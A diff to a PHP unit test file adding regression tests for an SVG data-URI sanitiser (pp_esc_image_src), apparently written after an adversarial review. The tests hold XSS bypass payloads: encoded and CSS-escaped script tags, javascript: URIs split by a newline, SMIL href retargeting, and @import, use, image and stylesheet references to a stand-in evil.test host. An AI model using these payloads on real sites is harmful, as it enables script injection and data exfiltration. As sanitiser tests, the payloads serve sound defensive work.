@@ -460,6 +460,98 @@ class ComponentPropsTest extends TestCase
         $this->assertNotSame('', $result);
     }
 
+    // ── Second-round cross-model adversarial review: bypasses of the
+    // DOMDocument-based rewrite ──────────────────────────────────────────
+
+    public function testEscImageSrcRejectsSixLayerEncodedScriptTag(): void
+    {
+        // Six layers of percent-encoding must not survive a decode budget
+        // that gives up too early — the loop must converge to a TRUE fixed
+        // point (or reject outright), not just decode a fixed N rounds and
+        // proceed on a still-partially-encoded string.
+        $payload = '<svg><script>alert(1)</script></svg>';
+        for ($i = 0; $i < 6; $i++) {
+            $payload = rawurlencode($payload);
+        }
+        $this->assertSame('', pp_esc_image_src('data:image/svg+xml,' . $payload));
+    }
+
+    public function testEscImageSrcRejectsBackslashCssEscapedScriptTag(): void
+    {
+        // "\3c"/"\3e" are inert to an XML parser (just three ordinary
+        // characters) but CSS's own url()-token tokenizer resolves
+        // backslash-hex escapes independently of percent-decoding — this
+        // reconstructs "<script>" only once the browser's CSS parser reads
+        // the surrounding style="...url(...)..." attribute.
+        $payload = 'data:image/svg+xml,<svg><rect data-x="\3cscript\3ealert(1)\3c/script\3e"/></svg>';
+        $result = pp_esc_image_src($payload);
+        $this->assertNotSame('', $result, 'A literal backslash in otherwise-safe SVG content should not be rejected outright.');
+        $this->assertStringNotContainsString('\\', $result);
+    }
+
+    public function testEscImageSrcRejectsStyleElement(): void
+    {
+        // Unlike <script>, an SVG's own <style> element IS applied during
+        // ordinary <img>/background-image rendering — an @import inside it
+        // would exfiltrate on every page view, not just on a deliberate
+        // "open image in new tab."
+        $payload = 'data:image/svg+xml,<svg><style>@import url(https://evil.test/x.css);</style></svg>';
+        $this->assertSame('', pp_esc_image_src($payload));
+    }
+
+    public function testEscImageSrcRejectsExternalHrefOnUseElement(): void
+    {
+        $payload = 'data:image/svg+xml,<svg xmlns:xlink="http://www.w3.org/1999/xlink"><use xlink:href="https://evil.test/x.svg#y"/></svg>';
+        $this->assertSame('', pp_esc_image_src($payload));
+    }
+
+    public function testEscImageSrcRejectsExternalHrefOnImageElement(): void
+    {
+        $payload = 'data:image/svg+xml,<svg><image href="https://evil.test/beacon.png"/></svg>';
+        $this->assertSame('', pp_esc_image_src($payload));
+    }
+
+    public function testEscImageSrcAcceptsSameDocumentFragmentHrefOnUseElement(): void
+    {
+        // A <use> referencing a locally-defined symbol is a legitimate,
+        // common SVG pattern and must not be rejected.
+        $payload = 'data:image/svg+xml,<svg><symbol id="icon"><circle r="5"/></symbol><use href="#icon"/></svg>';
+        $this->assertNotSame('', pp_esc_image_src($payload));
+    }
+
+    public function testEscImageSrcRejectsSmilAnimateRetargetingHref(): void
+    {
+        $payload = 'data:image/svg+xml,<svg><a id="x" href="https://safe.example/"><text>click</text></a>'
+            . '<animate href="#x" attributeName="href" values="https://safe.example/;javascript:alert(1)" dur="1s"/></svg>';
+        $this->assertSame('', pp_esc_image_src($payload));
+    }
+
+    public function testEscImageSrcRejectsProcessingInstruction(): void
+    {
+        $payload = 'data:image/svg+xml,<?xml-stylesheet type="text/css" href="https://evil.test/x.css"?><svg><circle r="5"/></svg>';
+        $this->assertSame('', pp_esc_image_src($payload));
+    }
+
+    public function testEscImageSrcRejectsJavascriptUriWithEmbeddedNewline(): void
+    {
+        // Browser URL parsing strips embedded tab/newline/CR from anywhere
+        // in a URL string, so "java\nscript:" resolves to "javascript:" at
+        // navigation time even though no literal "javascript:" substring
+        // (and no attribute value literally starting with it) exists in
+        // the parsed DOM text.
+        $payload = "data:image/svg+xml,<svg><a href=\"java&#x0A;script:alert(1)\">x</a></svg>";
+        $this->assertSame('', pp_esc_image_src($payload));
+    }
+
+    public function testEscImageSrcRejectsDataTextHtmlHrefInsideSvg(): void
+    {
+        // A literal "<" inside an attribute value isn't valid XML, so the
+        // nested script markup is XML-entity-escaped here, same as any
+        // well-formed SVG author would have to write it.
+        $payload = 'data:image/svg+xml,<svg><a href="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;">x</a></svg>';
+        $this->assertSame('', pp_esc_image_src($payload));
+    }
+
     // ── End-to-end: exact production regression from #36 ────────────────────
 
     public function testHeroSplitVariantRendersDataUriSvgImageSrc(): void
